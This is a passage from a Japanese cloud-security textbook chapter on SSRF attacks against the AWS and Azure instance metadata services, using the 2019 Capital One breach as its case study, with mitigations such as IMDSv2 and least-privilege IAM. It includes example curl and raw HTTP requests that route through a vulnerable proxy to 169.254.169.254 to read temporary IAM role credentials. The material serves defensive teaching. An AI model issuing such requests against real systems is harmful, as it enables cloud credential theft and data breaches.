| 認可の判断 | 呼び出し先AWSサービスがIAMポリシーで判断 | 呼び出し先Azureサービスがロール割り当て／アクセスポリシーで判断（IMDS自身は検証しない） |
| 横展開の典型パス | S3・他IAMロールのAssumeRole | Key Vaultのシークレット、他サービスプリンシパルへのアイデンティティチェイニング |
| PaaS固有の緩和 | ECSタスクロール、Lambda実行ロールなど別経路 | App Service/Functions向け`IDENTITY_ENDPOINT`＋`IDENTITY_HEADER`方式 |

原理は共通している。**「本来はそのホスト自身だけがアクセスできるはずの内部APIを、SSRFで外部の攻撃者が代理アクセスしてしまい、そこで発行される正規の一時的な強い認証情報をまるごと持ち去る」**という構造は、クラウドプロバイダが変わっても本質的に同じである。違いはプロトコルの細部（ヘッダの有無、トークンの形式）と、その先にある権限管理モデル（AWSのIAMポリシー vs. AzureのRBAC/アクセスポリシー）にある。

### 防御のまとめ：仕組みに対応した多層防御

ここまでの4資料を踏まえ、防御側が押さえるべき層を整理する。

**アプリケーション層（SSRFそのものを起こさせない・到達させない）**
- ユーザー入力に由来するURL・ホスト名・IPアドレスを検証し、`169.254.169.254`や`168.63.129.16`を含むリンクローカルアドレス、およびプライベートIPレンジへのアウトバウンド通信を明示的に拒否する（ブロックリストよりも許可リスト方式が望ましい）。
- SSRFの原因になりやすい「URLをそのままサーバー側でフェッチする」実装を避け、外部URLを扱う機能はリダイレクトの追跡先も含めて検証する。
- CRLFインジェクションのような、ヘッダ注入を許してしまう実装（ユーザー入力を検証なしにHTTPヘッダやリクエスト行の構築に使う実装）を排除する。

**Identity・権限設計層（侵害されても被害を小さくする）**
- Managed Identityには必要最小限のロールのみを付与し、「とりあえずContributor」のような広い権限の後付けを避ける。
- Key VaultはアクセスポリシーモデルからAzure RBACモデルへの移行を検討し、誰がどの権限を持つかを監査しやすい状態に保つ。
- サービス間の信頼関係（あるIdentityが別のIdentityやサービスプリンシパルに対して持つ権限）を定期的に棚卸しし、アイデンティティチェイニングの経路を減らす。

**検知・監視層（起きたことに気づく）**
- Key Vaultの診断ログ（診断設定でLog Analyticsなどに転送する監査ログ）を有効化し、短時間での大量シークレット取得のような異常パターンにアラートを設定する。
- Azure AD サインインログだけでなく、Managed Identityによる非対話型トークン発行のログ・Azure Activity Logも監視対象に含める。
- IMDS/WireServerへの、アプリケーションの通常動作から外れたパターンのアクセス（例えば`resource`パラメータを次々に変えるトークンスプレーのような挙動）を検知できるよう、可能であればネットワークレベルでの監視も検討する。

いずれの層も単独では完全ではない。SSRFを完全にゼロにすることは難しく、Metadata要件のような単一ヘッダの防御も回避されうる。だからこそ「侵害の入口を減らす」「侵害されても持ち出せる権限を最小化する」「持ち出された後の異常な使用に気づく」という3層を組み合わせることが、この攻撃クラスに対する現実的な防御になる。

## Capital One事件（連鎖の象徴的実例）

2019年に発覚したCapital One侵害は、クラウドセキュリティの教科書に必ず登場する事件である。理由は単純で、この事件が「単発の脆弱性」ではなく、**複数の弱点が一本の鎖として連結したときに何が起きるか**を、現実の被害規模（1億人超の個人情報）とともに示したからだ。本節では、この鎖を構成した各リンク――WAFの設定ミス、SSRF、IMDS（Instance Metadata Service、EC2インスタンスが自分自身の情報や認証情報を取得するための内部エンドポイント）、過剰なIAM権限、S3への到達――を技術的な仕組みのレベルで分解し、なぜそれぞれが「次のリンク」を許してしまったのかを説明する。

### 事件の全体像

攻撃者はPaige Thompson（オンラインハンドル名"Erratic"）、元Amazon従業員である。2019年3月、彼女はCapital OneがAWS上で運用していたWeb Application Firewall（WAF）にSSRF（Server-Side Request Forgery、サーバー自身に任意の宛先へリクエストを送らせる脆弱性）の脆弱性を発見し、これを起点にEC2インスタンスメタデータサービスへ到達、そこから一時的なAWS認証情報（アクセスキー・シークレットキー・セッショントークン）を窃取した。その認証情報が紐づくIAMロールは、想定以上に広い範囲のS3バケットへの読み取り権限を持っており、結果としてクレジットカード申込データを中心に約1億600万件の個人情報（氏名・生年月日・住所・信用スコア・銀行口座番号・社会保障番号の一部など）が窃取された。事件は2019年7月に公表され、Thompsonは同月中にFBIに逮捕、2022年6月に陪審により有罪評決を受けた。規制当局である通貨監督庁（OCC）はCapital Oneに8,000万ドルの制裁金を科し、別途、集団訴訟の和解金として1億9,000万ドルが支払われている（合計の損失は2億7,000万ドルを超える）。

この事件の核心は「WAFが破られた」ことではない。WAFの脆弱性は攻撃の**入口**に過ぎず、被害の**規模**を決定づけたのは、その先にあったIAMロールの権限設計だった、という点が後述するhackaws.cloudの分析の主題でもある。

> ⚠️ **未取得の資料**: 「An SSRF, privileged AWS keys and the Capital One breach」（Appsecco、Riyaz Walikar氏）は自動取得できませんでした（理由: 掲載元ドメイン blog.appsecco.com が恒久的に appsecco.com のトップページへ301リダイレクトされており、記事本文が現存しないため）。以下のURLからご自身で直接ご覧ください: https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af 　（Web検索で得られた同記事の要約・引用の範囲で以下に補足する）

（以下は未取得資料の補足として一般知識に基づく解説です）

Appsecco記事の技術的な骨子は、後述するIMDSの仕組みと矛盾しない形で概ね次のように整理できる。Capital OneのWAF（ModSecurityベースの製品、reverse proxyとして動作しファイアウォールルールを適用する構成だったとされる）には、外部から受け取ったリクエストの一部を使って**WAF自身が別のURLへHTTPリクエストを発行してしまう**機能（あるいは設定ミス）があった。攻撃者はこの機能に、外部URLの代わりに以下のようなメタデータサービスのURLを注入したと推測されている。

```
curl "http://<vulnerable-waf-endpoint>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

`169.254.169.254`はAWS（および多くのクラウドベンダー）がすべてのEC2インスタンスに対して用意しているリンクローカルアドレスで、インスタンス自身のメタデータ（インスタンスID、ネットワーク設定、アタッチされたIAMロールの一時認証情報など）をHTTP GETで返す。WAFのプロセスは物理的にはCapital One所有のEC2インスタンス上で稼働しており、そのインスタンスにはS3バケットへのアクセスを想定した`ISRM-WAF-Role`のようなIAMロールがアタッチされていた。SSRFによってWAFプロセスに「自分自身」宛てのリクエストを送らせることで、攻撃者は本来WAFプロセスだけが持つべきローカルアクセス権を、外部のHTTPリクエスト経由で借用したことになる。

ロール名が判明した後は、そのロール専用の認証情報エンドポイントを叩くだけで一時クレデンシャルが平文のJSONとして返る。

```
curl "http://<vulnerable-waf-endpoint>/?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ISRM-WAF-Role"
```

このレスポンスに含まれる`AccessKeyId`・`SecretAccessKey`・`Token`をローカルのAWS CLIプロファイルに設定すれば、攻撃者の端末から正規のAPI呼び出しとしてS3にアクセスできてしまう。これが「なぜSSRFがS3データ窃取に直結するのか」という因果の核心である――**IMDSが返す認証情報には、それがSSRF経由で取得されたものか、正規のプロセスが取得したものかを区別する仕組みが（IMDSv1では）存在しない**からだ。

> 出典: An SSRF, privileged AWS keys and the Capital One breach — https://blog.appsecco.com/an-ssrf-privileged-aws-keys-and-the-capital-one-breach-4c3c2cded3af （本文は自動取得不可のため、上記は検索結果に基づく要約）

### IMDS（インスタンスメタデータサービス）の仕組みと、なぜSSRFから直結するのか

ここでIMDSの内部動作を仕組みレベルで押さえておく。EC2インスタンスにIAMロールをアタッチすると、AWSはハイパーバイザーレベルで動くメタデータサービス（`169.254.169.254`、リンクローカルアドレスなのでインターネットには経路が存在せず、そのインスタンス自身からしか到達できない）に、ロールに対応する一時クレデンシャルを配置する。このクレデンシャルはSTS（Security Token Service）が発行するもので、有効期限があり自動的にローテーションされる。EC2上で動くアプリケーション（AWS SDKなど）は、明示的な認証情報を持たなくても、このエンドポイントにHTTPでアクセスするだけでロールの権限を借りることができる――これが「インスタンスにロールをアタッチする」という運用の利便性の正体である。

問題は、Wiz Threat Landscapeのまとめが端的に指摘する通り、**IMDSv1（2019年当時の唯一のバージョン）へのリクエストには認証が一切不要**だったという点にある。

```
GET /latest/meta-data/iam/security-credentials/ISRM-WAF-Role HTTP/1.1
Host: 169.254.169.254
```

このリクエストは単純なGETであり、特別なヘッダーもトークンも要求しない。つまり、**インスタンス上で動く任意のプロセスが、意図の如何を問わず`169.254.169.254`宛てにGETリクエストを発行できさえすれば**、そのインスタンスにアタッチされたロールの一時認証情報を取得できてしまう。SSRFはまさに「意図しない宛先へのリクエストをサーバーに強制する」脆弱性であり、その宛先として`169.254.169.254`が選べる限り、SSRF単体がクレデンシャル窃取に直結する。これは実装上のバグというより、IMDSv1というプロトコル設計そのものの弱点であり、後述するIMDSv2はこの設計を変えることで対処した。

> 出典: Capital One incident (March 2019) — Wiz Cloud Threat Landscape — https://threats.wiz.io/all-incidents/capital-one-incident-march-2019

### なぜ「WAFのSSRF」だけで1億件が流出したのか — Blast Radius（爆発半径）という視点

hackaws.cloudの分析（"The Capital One Breach, Seven Years Later"）が提起する最も重要な論点は、**攻撃の起点（entry point）とインシデントの規模（blast radius、権限が及ぶ範囲＝爆発半径）はまったく別の変数である**という指摘だ。同記事は次のような対比を示している。

- インスタンスAのロールが単一のS3バケットへのアクセスしか持たない場合、そのインスタンスがSSRFで侵害されても被害は当該バケットの中身に限定される。
- インスタンスBのロールがワイルドカードで`s3:*`かつ`Resource: "*"`のような設計になっている場合、同じSSRF脆弱性が全S3バケットへの扉を開くことになる。

Capital Oneの事件はまさに後者に該当した。WAF用のIAMロール`ISRM-WAF-Role`（想定される用途はWAF自身のログ書き込みなど限定的な範囲のはず）が、実際には700以上のS3バケットに対する読み取り・リスト権限を持っていたとされ、これが1万件規模ではなく1億件規模の情報漏洩を招いた直接の原因になった。つまり、SSRFという入口の脆弱性は「機会」を与えたに過ぎず、実際の被害の大きさを決めたのは**IAMポリシーの権限設計（最小権限の原則が守られていたかどうか）**だったという結論になる。

この視点は、脆弱性対応の優先順位づけにも直結する。同記事は「侵入経路（entry points）は時代とともに変わり続けるが、blast radiusは定数（constant）である」と述べ、次のような論拠を挙げている。

- 2025年3月: F5 Labsが自動化されたSSRFスキャンキャンペーンを観測（対象は一般的なSSRF窃取パターン）
- 2025年: Grafanaに存在したSSRFを経由した認証情報漏洩の報告
- 2025年9月: Pandoc（ドキュメント変換ツール）のHTML処理を経由したメタデータアクセスの手法
- 2026年1月: Chainlit（LLMアプリ向けUIフレームワーク）経由でS3やSecrets Managerへの横展開が可能となる手法

これらは攻撃手法（entry point）としては互いにまったく異なるツール・脆弱性であるにもかかわらず、いずれも最終的に狙う先は同じ「IMDS→過剰なIAM権限→機密データストア」という同型の連鎖である。したがって、個々のSSRFパターンを塞ぐこと（Webアプリケーション側の入力検証など）は必要条件ではあるが十分条件ではなく、**万一SSRFが成立してもIAMロールが持つ権限を必要最小限に絞り込んでおくこと**が、被害規模を制御する上でより本質的な対策だとhackaws.cloudは主張している。

> 出典: The Capital One Breach, Seven Years Later — hackaws.cloud — https://hackaws.cloud/blog/capital-one-ssrf-imds-blast-radius

### IMDSv2による対策と、その普及の遅れ

Capital One事件を受けて、AWSは2019年11月（事件公表から約4ヶ月後）にIMDSv2を発表した。IMDSv1がステートレスな単純GETで完結するのに対し、IMDSv2は**セッション指向（session-oriented）**の設計に変わっている。具体的な手順は次の通り。

```
# 1. まずPUTリクエストでセッショントークンを取得する（TTLを秒単位で指定）
curl -X PUT "http://169.254.169.254/latest/api/token" \
     -H "X-aws-ec2-metadata-token-ttl-seconds: 21600"

# 2. 取得したトークンをヘッダーに付与しない限り、メタデータへのGETは拒否される
curl -H "X-aws-ec2-metadata-token: <取得したトークン>" \
     "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
```

このPUTリクエストが効くのは、**多くのSSRF脆弱性がPUTメソッドやカスタムヘッダーの付与を許さず、単純なGETしか転送できない**という実装上の制約があるためである。SSRFの典型的な悪用パターン（URLパラメータに宛先を渡す、リダイレクト先を追わせる等）は、リクエストのメソッドやヘッダーまで自由に制御できないケースが多く、IMDSv2はこの「制御できない部分」を認証の必須条件に組み込むことで、多くのSSRF経由の攻撃を無効化する。加えて、IMDSv2で発行されるトークンにはデフォルトでホップ制限（IP TTL=1）が設定されており、Dockerコンテナなど一段中継を挟む経路からの到達も制限できる。

もっとも、この対策はあくまで「有効化して、かつIMDSv1を無効化して初めて」効果を発揮する。IMDSv1を許可したままIMDSv2を併用可能にしているだけでは、攻撃者は引き続き単純なGETでIMDSv1経由の窃取を試みられる。hackaws.cloudが示す採用率の推移は次の通りで、事件から7年近く経過してもなお普及が緩やかであることを示している。

| 年度 | IMDSv2強制（IMDSv1無効化）の実装率 |
|------|------|
| 2022年 | 約7% |
| 2023年 | 約21% |
| 2024年 | 約32% |
| 2025年 | 約49% |

同記事は「直近2週間のトラフィックを見ると82%のインスタンスが事実上IMDSv2のみを使っている」一方で「約半数の組織はIMDSv1を明示的に無効化する設定変更をまだ行っていない」とも指摘しており、実際の通信パターンと設定上の強制状態には乖離があることが分かる。IMDSv2が使えるだけでは不十分で、**IMDSv1を明示的に無効化する（`HttpTokens: required`をインスタンスメタデータオプションに設定する）**ところまでやって初めて防御が完成する。

### 演習用の再現環境（Terraform）と学習の要点

技術的な因果関係を手元で確認したい読者向けに、`shayrm/CapitalOne-SSRF-demo`はTerraformでこの攻撃チェーンを模擬的に再現する構成を公開している。本教科書は防御目的での学習に限定するため、実際の攻撃コマンドの再現は各自の自己所有・自己管理の検証環境でのみ行うべきであり、本番環境や他者のシステムに対して同様の手順を試みてはならない。

構成の概要は次の通りである。

- EC2インスタンス（意図的に脆弱なNode.jsアプリケーションを動作させ、URLをパラメータとして受け取り、そのURL先のコンテンツを取得して返すプロキシ的な機能を持つ。これ自体がSSRFの典型的な脆弱コードパターン）
- そのEC2にアタッチされたIAMインスタンスプロファイル（S3への読み取り権限を持つ）
- 機密ファイルを格納したS3バケット
- IMDSv1が有効なメタデータサービス設定

デモの流れは、脆弱なアプリケーション経由で`http://169.254.169.254/latest/meta-data/`へリクエストを送り、IAMロール名を列挙し、そのロールの一時クレデンシャルを取得し、取得したクレデンシャルでAWS CLIから対象S3バケットの中身を読み出す、という一連の手順になっている。これはCapital One事件の実際の攻撃チェーンをスケールダウンして体験させる教材であり、学習のポイントとしてリポジトリが挙げているのは次の3点に整理できる。

1. IMDSv1では認証情報の取得に認証が不要であること
2. WAFやプロキシのような「代理でHTTPリクエストを発行するコンポーネント」がSSRFの温床になりやすいこと
3. IAMロールの権限を必要最小限に絞ることが、同じ脆弱性が存在しても被害を限定する唯一の実効的な防御になること

> 出典: shayrm/CapitalOne-SSRF-demo — https://github.com/shayrm/CapitalOne-SSRF-demo

### この事件から導く防御チェックリスト

Capital One事件を一つの「連鎖」として捉え直すと、防御側が塞ぐべきポイントは攻撃の各段階に対応して複数存在することが分かる。どれか一つだけを塞いでも、他のリンクが生きていれば別の攻撃手法（entry point）で同じ連鎖が再現されうる、という点が本事件の最大の教訓である。

- **WAF・リバースプロキシ・変換ツールなど「代理でリクエストを発行するコンポーネント」の入力検証**: 外部から渡されたURLをそのまま内部リクエストの宛先に使わない。少なくとも`169.254.169.254`を含むリンクローカルアドレス帯や、プライベートIPレンジへのリクエストを明示的にブロックする。
- **IMDSv2の強制**: `aws ec2 modify-instance-metadata-options --http-tokens required`のように、`HttpTokens`を`required`に設定し、IMDSv1へのフォールバックを禁止する。新規起動するインスタンスについては起動テンプレート側でデフォルトをrequiredにしておく。
- **IAMロールの最小権限化**: ロールごとに「本当に必要なリソースARNとアクションだけ」を許可し、`Resource: "*"`のようなワイルドカードを避ける。WAFやログ収集用のロールに、業務データを保持するS3バケットへの広範なアクセス権を持たせない。
- **各コンピュートID（EC2・ECS・Lambda等）のblast radiusの定期的な棚卸し**: 「このロールが侵害されたら、どこまで到達できるか」を可視化し、脆弱性が発見される前に権限を絞り込んでおく。
- **異常なメタデータサービスアクセスの検知**: VPCフローログやGuardDutyなどで、通常のアプリケーションプロセス以外からの`169.254.169.254`宛てトラフィックや、通常と異なるパターンでのSTS一時クレデンシャル利用（普段アクセスしないバケットへの大量GET等）を監視する。

Capital One事件は、単一の脆弱性クラスとしては「よくあるSSRF」に分類される事例である。しかし、その被害規模を決定づけたのはSSRFそのものの巧妙さではなく、その先にあったIAM権限設計の甘さだった。次節以降で扱う「メタデータサービスから一時クレデンシャルを窃取する具体的な手口」と「IAMロールの権限を最小化する設計原則」は、この事件が突きつけた教訓を技術的に裏付けるものとして読み進めてほしい。


---

[← 第1章 クラウドとIAMの基礎（攻撃者視点）](01-foundations.md) ｜ [目次](index.md) ｜ [第3章 窃取クレデンシャル後のenumeration →](03-post-theft-enumeration.md)
